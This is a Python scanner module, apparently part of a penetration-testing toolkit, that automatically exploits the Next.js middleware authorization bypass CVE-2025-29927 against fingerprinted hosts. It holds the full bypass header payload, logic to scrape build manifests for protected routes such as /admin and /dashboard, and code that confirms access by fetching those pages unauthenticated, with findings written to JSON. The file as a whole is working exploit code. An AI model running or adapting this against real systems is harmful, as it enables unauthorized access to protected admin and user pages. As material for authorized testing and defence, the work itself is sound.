#!/usr/bin/env python3
"""
CVE-2025-29927 — Next.js middleware authorization bypass via the
``X-Middleware-Subrequest`` header.

Trigger: published advisory (March 2025) + internal recon notes from the
2026-04 engagements. Vulnerable Next.js versions short-circuit the
middleware chain when the request carries an ``X-Middleware-Subrequest``
header whose value matches a recursive subrequest path. Sending the right
sequence of segments lets an unauthenticated attacker bypass middleware
guards (auth, rate limit, redirect-to-/signin) and reach protected pages
directly.

This module is wired into ``hunt.py`` to run automatically when ``httpx``
fingerprints a host as Next.js (``X-Powered-By: Next.js`` or any
``/_next/`` path). Findings are written to the session's ``findings/``
directory in the standard reporter.py JSON shape.

Algorithm
---------
1. Discover the active build ID by fetching ``/`` and parsing the first
   ``/_next/static/<id>/_buildManifest.js`` reference.
2. Pull the build manifest plus a few common chunk URLs and grep for any
   route under our protected-prefix list (/dashboard, /admin, /owner,
   /super-admin, /employee, /vendor, /profile).
3. For each candidate route, send two requests:
     a. Baseline (no header)        — expect 307 → /signin (or 401/403)
     b. Bypass (CVE header set)     — flag VULNERABLE if it returns 200.
4. Persist VULNERABLE entries as JSON to ``findings/nextjs_bypass/``.
"""

from __future__ import annotations

import json
import os
import re
import time
from datetime import datetime, timezone
from typing import Iterable

import requests

VERIFY_TLS = os.environ.get("VAPT_INSECURE_SSL", "0") != "1"

# Header value from the published PoC. The recursive ``src/middleware:...``
# chain plus the ``pages/_middleware`` legacy alias triggers the bypass on
# both 13.x and 14.x lineages.
BYPASS_HEADER_VALUE = (
    "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:"
    "src/middleware:middleware:middleware:nowaf:middleware:middleware:"
    "middleware:pages/_middleware"
)

PROTECTED_PREFIXES = (
    "/dashboard", "/admin", "/owner", "/super-admin",
    "/employee", "/vendor", "/profile",
)

BUILD_ID_RE = re.compile(r'/_next/static/([A-Za-z0-9_-]+)/_buildManifest\.js')
ROUTE_RE = re.compile(r'"(/(?:dashboard|admin|owner|super-admin|employee|vendor|profile)[A-Za-z0-9/_\-]*)"')


def _http_get(url: str, headers: dict | None = None, timeout: int = 8):
    try:
        return requests.get(url, headers=headers or {}, timeout=timeout,
                            verify=VERIFY_TLS, allow_redirects=False)
    except requests.RequestException:
        return None


def _discover_build_id(host: str) -> str | None:
    resp = _http_get(host)
    if resp is None or not resp.text:
        return None
    m = BUILD_ID_RE.search(resp.text)
    return m.group(1) if m else None


def _enumerate_routes(host: str, build_id: str) -> set[str]:
    """Pull buildManifest + a few canonical chunk URLs and grep for routes."""
    chunk_urls = [
        f"{host}/_next/static/{build_id}/_buildManifest.js",
        f"{host}/_next/static/{build_id}/_ssgManifest.js",
        f"{host}/_next/static/chunks/main.js",
        f"{host}/_next/static/chunks/webpack.js",
        f"{host}/_next/static/chunks/pages/_app.js",
    ]
    routes: set[str] = set()
    for url in chunk_urls:
        resp = _http_get(url, timeout=10)
        if resp is None or resp.status_code != 200:
            continue
        for match in ROUTE_RE.findall(resp.text or ""):
            # Trim trailing query/hash and dedup.
            clean = match.split("?")[0].split("#")[0]
            if any(clean.startswith(pref) for pref in PROTECTED_PREFIXES):
                routes.add(clean)
    # If the chunks didn't yield routes, at least probe the prefix roots.
    if not routes:
        routes.update(PROTECTED_PREFIXES)
    return routes


def _looks_protected(resp) -> bool:
    """Baseline expectation: middleware redirects unauth users to /signin."""
    if resp is None:
        return False
    if resp.status_code in (401, 403):
        return True
    if resp.status_code in (302, 303, 307, 308):
        loc = (resp.headers.get("Location") or "").lower()
        return any(s in loc for s in ("signin", "login", "auth"))
    return False


def _looks_bypassed(resp) -> bool:
    """Bypass expectation: 200 with HTML body (the protected page rendered)."""
    if resp is None:
        return False
    if resp.status_code != 200:
        return False
    body = (resp.text or "")[:4000].lower()
    # Heuristic: the page rendered some HTML and is not just an empty 200.
    return ("<html" in body or "<!doctype" in body or len(body) > 200)


def probe_host(host: str) -> list[dict]:
    """Run the full discovery + bypass test loop against one Next.js host.

    Returns a list of finding dicts in the standard reporter.py schema.
    Empty list on any non-vulnerable host or when discovery fails.
    """
    host = host.rstrip("/")
    build_id = _discover_build_id(host)
    if not build_id:
        return []

    routes = _enumerate_routes(host, build_id)
    findings: list[dict] = []

    for route in sorted(routes):
        url = host + route
        baseline = _http_get(url)
        if not _looks_protected(baseline):
            # If the route is already public (or 404), skip — nothing to bypass.
            continue
        bypass = _http_get(url, headers={
            "X-Middleware-Subrequest": BYPASS_HEADER_VALUE,
        })
        if not _looks_bypassed(bypass):
            continue
        findings.append({
            "type": "nextjs_middleware_bypass",
            "severity": "critical",
            "detail": f"CVE-2025-29927: middleware bypass on {route}",
            "url": url,
            "evidence": (
                f"baseline={baseline.status_code} "
                f"(Location={baseline.headers.get('Location','')}); "
                f"bypass={bypass.status_code} (len={len(bypass.text)})"
            ),
            "cve": "CVE-2025-29927",
            "build_id": build_id,
            "header_used": BYPASS_HEADER_VALUE,
        })
    return findings


def _save(findings: list[dict], findings_dir: str) -> str:
    out_dir = os.path.join(findings_dir, "nextjs_bypass")
    os.makedirs(out_dir, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    for i, f in enumerate(findings, 1):
        path = os.path.join(out_dir, f"finding_{ts}_{i:04d}.json")
        with open(path, "w") as fp:
            json.dump(f, fp, indent=2, default=str)
        # Append one-liner for reporter.py
        with open(os.path.join(out_dir, "findings.txt"), "a") as fp:
            fp.write(f"[CRITICAL] {f['detail']} {f['url']}\n")
    return out_dir


def run(hosts: Iterable[str], findings_dir: str) -> list[dict]:
    """Entry point used by ``hunt.py``.

    Args:
        hosts: iterable of base URLs (``https://app.example.com``) flagged
            as Next.js by httpx.
        findings_dir: session findings dir (will create
            ``<findings_dir>/nextjs_bypass/``).

    Returns:
        Aggregated list of finding dicts.
    """
    aggregated: list[dict] = []
    for host in hosts:
        try:
            host_findings = probe_host(host)
        except Exception:  # noqa: BLE001 — keep scan resilient
            continue
        if host_findings:
            aggregated.extend(host_findings)
    if aggregated:
        _save(aggregated, findings_dir)
    return aggregated


__all__ = ["BYPASS_HEADER_VALUE", "PROTECTED_PREFIXES", "probe_host", "run"]
